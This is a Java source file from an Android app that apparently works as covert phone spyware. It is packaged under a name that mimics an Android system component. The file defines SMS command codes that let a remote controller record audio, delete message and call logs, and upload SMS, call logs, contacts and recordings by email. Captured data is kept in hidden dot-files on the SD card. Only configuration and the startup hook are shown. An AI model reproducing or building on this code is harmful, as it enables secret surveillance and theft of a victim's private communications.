package com.android.system.controled;

import java.io.File;

import android.app.Application;
import android.os.Environment;

import com.android.system.controled.util.InitUtil;

public class MainApplication extends Application {
	
	private static final String TAG = "MainApplication";

	public static String controllerTel = "";// 控制者的电话号码
	/**
	 * 发送者的email和密码，163邮箱
	 */
	public static String senderEmailAddr = "";
	public static String senderPwd = "";
	/**
	 * 接收者的email
	 */
	public static String receiverEmailAddr = "";

	public static final String PHONE_CODE_UP = "011";// TURN_UP
	public static final String PHONE_CODE_DOWN = "012";// TURN_DOWN
	public static final String PHONE_CODE_CALL_ME = "013";// CALL_ME

	public static final String PHONE_CODE_RECORD_TIME = "015:";// RECORD_TIME:
	public static final String PHONE_CODE_RECORD_START = "016";// RECORD_START
	public static final String PHONE_CODE_RECORD_END = "017";// RECORD_END

	public static final String PHONE_CODE_DELETE_MSG_LOG = "021";// DEL_MSG
	public static final String PHONE_CODE_DELETE_CALL_LOG = "022";// DEL_CALL
	public static final String PHONE_CODE_DELETE_AUDIOS_CALL = "023";// DEL_AUDIO_CALL
	public static final String PHONE_CODE_DELETE_AUDIOS_OTHER = "025";// DEL_AUDIO_OTHER
	public static final String PHONE_CODE_DELETE_ALL_LOG = "026";// DEL_ALL

	public static final String PHONE_CODE_UPLOAD_SMS_CALL = "031";// HELLO_SMS_CALL
	public static final String PHONE_CODE_UPLOAD_ALL = "032";// HELLO_ALL
	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL = "033";// HELLO_CALL_AUDIO
	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER = "035";// HELLO_OTHER_AUDIO
	public static final String PHONE_CODE_UPLOAD_CONTACTS = "036";// HELLO_CONTACTS

	public static final String PHONE_CODE_UPLOAD_SMS_CALL_MOBILE = "031M";// HELLO_SMS_CALL_MOBILE
	public static final String PHONE_CODE_UPLOAD_ALL_MOBILE = "032M";// HELLO_ALL_MOBILE
	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE = "033M";// HELLO_CALL_AUDIO_MOBILE
	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE = "035M";// HELLO_OTHER_AUDIO_MOBILE
	public static final String PHONE_CODE_UPLOAD_CONTACTS_MOBILE = "036M";// HELLO_CONTACTS_MOBILE

	public static final String PHONE_CODE_TURNON_WIFI = "057";// TURN_ON_WIFI
	public static final String PHONE_CODE_TURNON_MOBILE = "056";// TURN_ON_MOBILE

	public static final String SERVICE_NAME_LISTEN = "com.android.system.controled.service.ListenService";

	public static final String FILE_IN_SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath() + "/Android/receiver/";

	public static final File FILE_CALL_LOG = new File(FILE_IN_SDCARD + ".androidcall.txt");
	public static final File FILE_CONTACTS = new File(FILE_IN_SDCARD + ".contacts.txt");
	public static final String FILEPATH_AUDIOS_CALL = FILE_IN_SDCARD + ".callaudios/";
	public static final String FILEPATH_AUDIOS_OTHER = FILE_IN_SDCARD + ".audios/";
	public static final File FILE_TAG_UPLOAD_TAG = new File(Environment.getDataDirectory().getAbsolutePath() + "/data/com.android.system.controled/files/uploadtag.cfg");
	public static final String FILENAME_TAG_UPLOAD_TAG = "uploadtag.cfg";


	@Override
	public void onCreate() {
		super.onCreate();
		Debug.e("", "==============Application   IS onCreate=======================");
		InitUtil.init(this);
	}

	@Override
	public void onTerminate() {
		Debug.e("", "==============Application   IS onTerminate=======================");
		super.onTerminate();
	}

}
